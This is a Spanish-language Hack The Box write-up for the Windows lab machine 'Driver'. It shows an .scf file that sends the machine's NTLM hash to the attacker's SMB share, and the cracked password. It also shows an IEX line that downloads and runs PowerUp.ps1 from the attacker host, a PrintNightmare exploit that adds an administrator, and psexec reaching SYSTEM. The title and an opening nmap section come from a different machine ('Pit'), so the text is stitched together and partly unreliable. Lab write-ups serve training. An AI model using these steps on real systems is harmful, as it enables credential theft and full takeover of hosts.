---
layout: single
title: Hack The Box - Pit 
excerpt: "Es una máquina fácil de Hack The Box que presenta un portal web con funcionalidad de carga de archivos. Dichos archivos se almacenan en un recurso compartido, lo que permite aprovechar la carga de un archivo .scf para obtener un hash y acceder al sistema. Posteriormente, para la escalación de privilegios, se explota la vulnerabilidad PrintNightmare, logrando la ejecución de comandos con privilegios de administrador."
date: 2025-11-03
classes: wide
header:
  teaser: /assets/images/htb-writeup-Driver/Driver.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Hack The Box
  - Web Pentesting
tags:  
  - scf
  - PrintNightmare
  - Windows

---
<style>
  body {
    margin: 0;
    padding: 0;
    background-color: #0b101b;
    font-family: Arial, sans-serif;
    color: white;
  }

  /* Centramos únicamente los elementos visuales */
  .glitch,
  .title,
  .date,
  .info {
    text-align: center;
    margin-left: auto;
    margin-right: auto;
  }

  .glitch {
    position: relative;
    width: 90%;
    max-width: 400px;
    height: 300px;
    background-image: url("/assets/images/htb-writeup-Driver/Driver.png");
    background-size: cover;
    background-position: center;
    margin: 2rem auto 1rem auto;
    overflow: hidden;
  }

  .glitch:before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-image: url("/assets/images/htb-writeup-Driver/Driver.png");
    background-size: cover;
    background-position: center;
    opacity: 0.5;
    mix-blend-mode: hard-light;
    animation: glitch2 10s linear infinite;
  }

  .glitch:hover:before {
    animation: glitch1 1s linear infinite;
  }

  @keyframes glitch1 {
    0% { background-position: 0 0; filter: hue-rotate(0deg); }
    10% { background-position: 5px 0; }
    20% { background-position: -5px 0; }
    30% { background-position: 15px 0; }
    40% { background-position: -5px 0; }
    50% { background-position: -25px 0; }
    60% { background-position: -50px 0; }
    70% { background-position: 0 -20px; }
    80% { background-position: -60px -20px; }
    81% { background-position: 0 0; }
    100% { background-position: 0 0; filter: hue-rotate(360deg); }
  }

  @keyframes glitch2 {
    0% { background-position: 0 0; filter: hue-rotate(0deg); }
    10% { background-position: 15px 0; }
    15% { background-position: -15px 0; }
    20% { filter: hue-rotate(360deg); }
    25% { background-position: 0 0; filter: hue-rotate(0deg); }
    100% { background-position: 0 0; filter: hue-rotate(0deg); }
  }

  .title {
    font-size: 1.5rem;
    font-weight: bold;
    margin-bottom: 0.5rem;
  }

  .date {
    font-size: 1rem;
    color: #ccc;
    margin-bottom: 1rem;
  }

  .info {
    display: flex;
    justify-content: center;
    gap: 2rem;
    flex-wrap: wrap;
    margin-top: 1rem;
    font-size: 0.9rem;
  }

  .info div {
    text-align: center;
  }

  .info .label {
    color: #999;
    font-size: 0.8rem;
  }

  .icon {
    font-size: 2rem;
    color: #0f0;
    margin: 0.5rem 0;
  }

  /* Responsive */
  @media (max-width: 575.5px) {
    .glitch {
      height: 200px;
    }
    .title {
      font-size: 1.3rem;
    }
  }
</style>

<body>
    <div class="glitch">  
    </div>
</body>

<br>

`Driver` Es una máquina fácil de Hack The Box que presenta un portal web con funcionalidad de carga de archivos. Dichos archivos se almacenan en un recurso compartido, lo que permite aprovechar la carga de un archivo .scf para obtener un hash y acceder al sistema. Posteriormente, para la escalación de privilegios, se explota la vulnerabilidad PrintNightmare, logrando la ejecución de comandos con privilegios de administrador. 

## Enumeración

Realizando un escaneo de puertos TCP identifique los siguientes abiertos:

- 22 SSH
- 80 HTTP
- 9090 HTTP

```bash
Nmap scan report for 10.10.10.241
Host is up, received user-set (0.21s latency).
Scanned at 2025-06-18 01:21:08 EDT for 229s

PORT     STATE SERVICE         REASON         VERSION
22/tcp   open  ssh             syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)
80/tcp   open  http            syn-ack ttl 63 nginx 1.14.1
9090/tcp open  ssl/zeus-admin? syn-ack ttl 63
```
Realicé otro escaneo con Nmap utilizando la opción `-sVC` para obtener más información de los servicios identificados y pude obtener el dominio: `dms-pit.htb`

```bash
Nmap scan report for 10.10.10.241
Host is up, received user-set (0.21s latency).
Scanned at 2025-06-18 01:30:20 EDT for 230s

PORT     STATE SERVICE         REASON         VERSION
22/tcp   open  ssh             syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPRtC3Zd+DPBo1Raur/oVw/vz3BFbDkm6wmyb+E+0kBcgsDzm+UZqGn3u+rbI9L7PtNCIOTHa4j0Qs6fD9CvWa9xl1PXPQEI4X8UIfiDKduW+NhC0tRtfKzBSIR0XE+n2MjNCLM6pAR4xwhPZcpkXQmwurayT3OOHPV5QpOdSfzp0Zv56sBn3FmYe9j6fuhRFFL2x6Q8NfHOFkd4tAwkcCB1EebD0S/1ajB+TO6WeMOIHEU9HAAyg2LDzUKh0pzfFdK2MQHzKrGcFe3kOalz/dRJApa9wzUgq6iDbQvstDucPFLmvu8Y4YKFg1trKnf4Z2kopSUn0kKOxBROddoKOBdTyE309PF1b/Jo4ziDVVkRvPIHh06Se7NRVzbRtO8mBTFbi/Efag8QtLHeLDnF5SJj5SdTBiMiLvyGNWs3UySweOazyijw5bQtlgKbZHy0tLsjOCWjTuXGHAS3pHkkgSYKfr/NwWDsVQwHgCf1M7EZ23Uxww/qE6vRWbHStc6gM=
|   256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBASBJvHyFZwgmAuf2qWsMHborC5pS152XK8TVyTESkcPGWHqVAa/9rmFNvMuiMvBTPWhPq2+b5apFURHdxW2S5Q=
|   256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJmDbvdFwHALNAnJDXuRD6aO9yppoVnKbTLbUmn6CWUn
80/tcp   open  http            syn-ack ttl 63 nginx 1.14.1
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.1
|_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux
9090/tcp open  ssl/zeus-admin? syn-ack ttl 63
| ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US
| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
| Issuer: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US/organizationalUnitName=ca-5763051739999573755
```

Posteriormente, agregué el dominio `dms-pit.htb` y `pit.htb` al archivo `/etc/hosts`, apuntándolo a la IP de la máquina víctima, para futuros ataques.

```bash
┌──(root㉿kali)-[/home/kali]
└─# cat /etc/hosts 
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.10.241 dms-pit.htb pit.htb
```



```bash
Nmap scan report for 10.10.11.106
Host is up, received user-set (0.26s latency).
Scanned at 2025-08-27 17:44:58 CST for 14s

PORT      STATE    SERVICE      REASON          VERSION
80/tcp    open     http         syn-ack ttl 127 Microsoft IIS httpd 10.0
135/tcp   open     msrpc        syn-ack ttl 127 Microsoft Windows RPC
445/tcp   open     microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp  open     http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp filtered winrm        no-response
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
```
## Enumeración WEB 

Al ingresar a la pagina web de la máquina veo que hay un login, al cual pude ingresar con las credenciales `admin:admin`

![](/assets/images/htb-writeup-Driver/login.png)

![](/assets/images/htb-writeup-Driver/dash.png)

Con whatweb obtuve la sig. información

```bash
──(root💀kali)-[/home/kali]
└─# whatweb http://10.10.11.106/                                                                                                                          1 ⨯
http://10.10.11.106/ [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.106], Microsoft-IIS[10.0], PHP[7.3.25], WWW-Authenticate[MFP Firmware Update Center. Please enter password for admin][Basic], X-Powered-By[PHP/7.3.25]
```
Navegando en el sitio web en la sección `Firmware updates` se indica que se seleccione el modelo de la impresora y se cargara la actualización de firmware correspondiente en su recurso compartido de archivos y su equipo lo revisara manualmente. Dado que cada archivo se revisa manualmente y se carga en un recurso compartido SMB, podríamos cargar un archivo que, al ejecutarse, se conecte a nuestra máquina local mediante SMB, lo que nos permite obtener un hash NTLM.

Para lograrlo cargue un archivo scf, primero cree el archivo scf con el siguiente contenido

```bash
┌──(root㉿kali)-[/home/kali]
└─# cat p3rr1n.scf 
[Shell]
Command=2
IconFile=\\10.10.16.8\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```
Posteriormente cree un recurso compartido con impacket

```bash
┌──(root㉿kali)-[/home/kali]
└─# impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```
Después cargue el archivo scf mediante el sitio web

![](/assets/images/htb-writeup-Driver/scf.png)

Una vez cargado el archivo recibí un hash NTLMV2 

```bash
┌──(root㉿kali)-[/home/kali]
└─# impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.106,49414)
[*] AUTHENTICATE_MESSAGE (DRIVER\tony,DRIVER)
[*] User DRIVER\tony authenticated successfully
[*] tony::DRIVER:aaaaaaaaaaaaaaaa:a38c4685625798836643bb67105090a9:01010000000000000023be4db817dc01318aab9a9905c7fd0000000001001000660055006e005800730048004300530003001000660055006e0058007300480043005300020010004e0073006f005400540064004d007600040010004e0073006f005400540064004d007600070008000023be4db817dc0106000400020000000800300030000000000000000000000000200000620a3522667d43df34d81782dc8ce426d74ffefe68391e1674661ec400432bef0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003800000000000000000000000000
[*] Connecting Share(1:IPC$)
[-] SMB2_TREE_CONNECT not found share
[-] SMB2_TREE_CONNECT not found share
[*] Disconnecting Share(1:IPC$)
[*] Closing down connection (10.10.11.106,49414)
[*] Remaining connections []
```
Posteriormente rompí el hash con john 

```bash
┌──(root㉿kali)-[/home/kali]
└─# john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
liltony          (tony)     
1g 0:00:00:00 DONE (2025-08-27 21:18) 50.00g/s 1638Kp/s 1638Kc/s 1638KC/s !!!!!!..eatme1
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```
Después valide las credenciales en SMB y WINRM y funcionaron 

```bash
┌──(root㉿kali)-[/home/kali]
└─# nxc smb 10.10.11.106 -u 'tony' -p 'liltony'
SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Build 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True) 
SMB         10.10.11.106    445    DRIVER           [+] DRIVER\tony:liltony 
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali]
└─# nxc winrm 10.10.11.106 -u 'tony' -p 'liltony'
WINRM       10.10.11.106    5985   DRIVER           [*] Windows 10 Build 10240 (name:DRIVER) (domain:DRIVER)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.106    5985   DRIVER           [+] DRIVER\tony:liltony (Pwn3d!)
```

```bash
┌──(root㉿kali)-[/home/kali]
└─# evil-winrm -i 10.10.11.106 -u 'tony' -p 'liltony'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\tony\Documents> whoami
driver\tony
```
## Escalada de privilegios

Para enumerar le sistema utilice PowerUp.ps1 para evitar importar y después invocar el script le agregue al final del script la línea `Invoke-AllChecks` posteriormente coloque un servidor temporal con python y llame el script con IEX de esta manera cuando llegue al final de la línea ejecutara `Invoke-AllChecks` y recolectara toda la información del sistema 

```bash
*Evil-WinRM* PS C:\Users\tony\Documents> IEX(New-Object Net.WebClient).downloadString('http://10.10.16.8/PowerUp.ps1')
Access denied 
At line:2066 char:21
+     $VulnServices = Get-WmiObject -Class win32_service | Where-Object ...
+                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand
Access denied 
At line:2133 char:5
+     Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pat ...
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand
Cannot open Service Control Manager on computer '.'. This operation might require other privileges.
At line:2189 char:5
+     Get-Service | Test-ServiceDaclPermission -PermissionSet 'ChangeCo ...
+     ~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Get-Service], InvalidOperationException
    + FullyQualifiedErrorId : System.InvalidOperationException,Microsoft.PowerShell.Commands.GetServiceCommand


DefaultDomainName    : DRIVER
DefaultUserName      : tony
DefaultPassword      :
AltDefaultDomainName :
AltDefaultUserName   :
AltDefaultPassword   :
Check                : Registry Autologons


*Evil-WinRM* PS C:\Users\tony\Documents> 

Si embargo, la ejecución no mostro mucho así que ejecute winpeas.exe  

```bash
PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.0.10240.17146
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 134B
```
Revisando el archivo `RICOH PCL6 UniversalDriver V4.23` veo que tiene algo de información sobre la impresora donde se incluye el nombre y la versión del driver  `RICOH PCL6 UniversalDriver V4.23` realizando una búsqueda identifiqué un exploit para este driver en metasploit, sin embargo también viendo los puertos TCP en escucha hay uno con un nombre de proceso peculiar`spoolsv`

```bash
  Enumerating IPv4 connections
                                                     
  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               80            0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               135           0.0.0.0               0               Listening         704             svchost
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49408         0.0.0.0               0               Listening         464             wininit
  TCP        0.0.0.0               49409         0.0.0.0               0               Listening         932             svchost
  TCP        0.0.0.0               49410         0.0.0.0               0               Listening         1180            spoolsv
  TCP        0.0.0.0               49411         0.0.0.0               0               Listening         816             svchost
  TCP        0.0.0.0               49412         0.0.0.0               0               Listening         560             services
  TCP        0.0.0.0               49413         0.0.0.0               0               Listening         568             lsass
  TCP        10.10.11.106          139           0.0.0.0               0               Listening         4               System
```
Realizando una búsqueda de vulnerabilidades que afecten a este proceso hay una en particular llamada `PrintNightmare` para explotarla seguí esta PoC [PrintNightmare](https://github.com/JohnHammond/CVE-2021-34527) Primero cargue el script a la maquina victima

```bash
┌──(root㉿kali)-[/home/kali]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.106 - - [28/Aug/2025 15:29:14] "GET /CVE-2021-34527.ps1 HTTP/1.1" 200 -
```
Una vez que lo llame no aparece al ejecutar dir sin embargo para ejecutar el script y poder crear un usuario que este dentro del grupo administradores debe ejecutarse:

```bash
Invoke-Nightmare -DriverName "Xerox" -NewUser "p3rr1n" -NewPassword "Admin123."
```
```bash
*Evil-WinRM* PS C:\windows\temp\privesc> Invoke-Nightmare -DriverName "Xerox" -NewUser "p3rr1n" -NewPassword "Admin123."
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user p3rr1n as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
```
```bash
*Evil-WinRM* PS C:\windows\temp\privesc> net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
john                     p3rr1n                   tony
The command completed with one or more errors.

*Evil-WinRM* PS C:\windows\temp\privesc> net user p3rr1n
User name                    p3rr1n
Full Name                    p3rr1n
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/28/2025 8:09:00 PM
Password expires             Never
Password changeable          8/28/2025 8:09:00 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.
```
Después valide las credenciales con netexec y veo que tengo un pwned en SMB

```bash
┌──(root㉿kali)-[/home/kali]
└─# nxc smb 10.10.11.106 -u 'p3rr1n' -p 'Admin123.'
SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Build 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True) 
SMB         10.10.11.106    445    DRIVER           [+] DRIVER\p3rr1n:Admin123. (Pwn3d!)
```
Para poder obtener una shell utilice psexec

```bash
┌──(root㉿kali)-[/home/kali]
└─# impacket-psexec WORKGROUP/p3rr1n@10.10.11.106 cmd.exe
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on 10.10.11.106.....
[*] Found writable share ADMIN$
[*] Uploading file thPGyUDV.exe
[*] Opening SVCManager on 10.10.11.106.....
[*] Creating service ZICz on 10.10.11.106.....
[*] Starting service ZICz.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10240]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 
```





